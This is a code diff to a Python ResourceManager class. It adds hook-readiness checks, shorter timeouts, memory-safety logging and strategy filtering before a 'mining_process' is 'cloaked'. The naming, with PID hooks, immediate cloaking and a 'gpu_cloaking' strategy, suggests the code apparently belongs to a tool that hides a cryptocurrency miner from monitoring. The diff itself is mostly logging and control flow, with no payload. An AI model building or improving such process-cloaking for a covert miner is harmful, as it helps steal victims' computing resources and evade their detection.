@@ -544,21 +544,26 @@ class ResourceManager(IResourceManager):
                 
                 self.logger.info(f"🔍 [PHASE3++] Checking hook readiness for PID {pid}")
                 
-                # Check if hooks are ready từ PHASE 3+ completion
+                # ✅ MEMORY-SAFE: Check if hooks are ready từ PHASE 3+ completion
                 if coordinator.check_hooks_ready(pid):
-                    self.logger.info(f"✅ [PHASE3++] Hooks ready for PID {pid} - proceeding immediately")
+                    self.logger.info(f"✅ [PHASE3++] Hooks ready for PID {pid} - proceeding with coordinated cloaking")
                 else:
-                    self.logger.info(f"⏳ [PHASE3++] Hooks not ready for PID {pid} - waiting...")
+                    self.logger.warning(f"⚠️ [MEMORY-SAFETY] Hooks not ready for PID {pid} - this may cause memory conflicts")
+                    self.logger.info(f"⏳ [PHASE3++] Waiting for hook coordination before cloaking...")
                     
-                    # Wait for hooks với timeout
-                    if coordinator.wait_for_hooks_ready(pid, timeout=70):
-                        self.logger.info(f"✅ [PHASE3++] Hooks became ready for PID {pid} - proceeding")
+                    # ✅ CRITICAL: Wait for hooks với timeout để tránh memory conflicts
+                    if coordinator.wait_for_hooks_ready(pid, timeout=30):
+                        self.logger.info(f"✅ [PHASE3++] Hooks became ready for PID {pid} - safe to proceed with cloaking")
                     else:
-                        self.logger.warning(f"⏰ [PHASE3++] Timeout waiting for hooks PID {pid} - proceeding anyway")
+                        self.logger.error(f"🚨 [MEMORY-SAFETY] Timeout waiting for hooks PID {pid}")
+                        self.logger.error(f"⚠️ [RISK] Proceeding with cloaking WITHOUT coordination may cause bad_alloc")
+                        # ✅ ENHANCED: Report memory safety risk
+                        self.logger.error(f"💀 [ANALYSIS] This uncoordinated cloaking may be the cause of bad_alloc after 75s")
                         
             except Exception as coord_err:
                 self.logger.error(f"❌ [PHASE3++] Hook Coordinator check failed: {coord_err}")
-                self.logger.info(f"🔄 [PHASE3++] Proceeding with cloaking activation anyway")
+                self.logger.error(f"🚨 [CRITICAL] Cannot verify hook readiness - high risk of memory conflicts")
+                self.logger.warning(f"🔄 [FALLBACK] Proceeding with cloaking activation anyway (unsafe)")
             
             self.logger.info(f"🔒 [IMMEDIATE-CLOAKING] Starting immediate cloaking for PID {mining_process.pid}")
             
@@ -1128,17 +1133,40 @@ class ResourceManager(IResourceManager):
                     # ✅ STRATEGY APPLICATION TRACKING: Track success/failure of each strategy
                     strategy_results = {'applied': [], 'failed': [], 'total': len(strategies)}
                     
+                    # ✅ MEMORY-SAFE COORDINATION: Verify coordination before strategy application
+                    coordination_verified = False
+                    try:
+                        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'coordination'))
+                        from coordinator import get_hook_coordinator
+                        coordinator = get_hook_coordinator()
+                        
+                        if coordinator.check_hooks_ready(pid):
+                            coordination_verified = True
+                            self.logger.info(f"🔒 [MEMORY-SAFE] Hook coordination verified for PID={pid} - proceeding with strategies")
+                        else:
+                            self.logger.warning(f"⚠️ [MEMORY-RISK] No hook coordination for PID={pid} - applying conservative strategies only")
+                    except Exception as coord_check_err:
+                        self.logger.warning(f"⚠️ [COORDINATION-CHECK] Failed to verify coordination: {coord_check_err}")
+                    
                     # ✅ DIAGNOSTIC: Log strategy processing start
                     self.logger.debug(f"🔍 [DIAGNOSTIC] Starting strategy processing for PID={pid}")
                     self.logger.debug(f"📋 Strategies to apply: {strategies}")
+                    self.logger.debug(f"🔒 Coordination verified: {coordination_verified}")
                     
                     for strat in strategies:
                         try:
+                            # ✅ MEMORY-SAFE STRATEGY FILTERING: Skip memory-intensive strategies if not coordinated
+                            if not coordination_verified and strat in ['gpu_cloaking', 'memory']:
+                                self.logger.warning(f"⚠️ [MEMORY-SAFETY] Skipping {strat} - no coordination (memory risk)")
+                                strategy_results['failed'].append(strat)
+                                continue
+                            
                             # ✅ INTELLIGENT CACHING: Use advanced cache system
                             creation_start = time.time()
                             
                             # ✅ DIAGNOSTIC: Log each strategy attempt
                             self.logger.debug(f"🎯 [DIAGNOSTIC] Attempting strategy: {strat} for PID={pid}")
+                            self.logger.debug(f"🔒 [COORDINATION] Strategy {strat} - coordination_verified: {coordination_verified}")
                             
                             # ✅ CACHE LOOKUP: Try to get from intelligent cache
                             s = self.shared_resource_manager.strategy_cache.get(
